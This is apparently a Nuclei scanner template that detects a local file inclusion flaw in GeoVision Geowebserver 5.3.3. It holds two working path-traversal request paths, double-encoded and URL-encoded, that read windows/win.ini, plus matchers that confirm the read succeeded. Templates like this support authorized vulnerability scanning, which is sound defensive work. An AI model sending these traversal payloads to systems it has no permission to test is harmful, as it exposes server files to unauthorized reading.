id: geowebserver-lfi

info:
  name: GeoVision Geowebserver 5.3.3 - LFI
  author: madrobot
  severity: high
  reference: https://www.exploit-db.com/exploits/50211
  tags: geowebserver,lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/Visitor//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows\win.ini"
      - "{{BaseURL}}/Visitor/bin/WebStrings.srf?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&obj_name=aaa"

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "\\[(font|extension|file)s\\]"
        part: body

      - type: status
        status:
          - 200
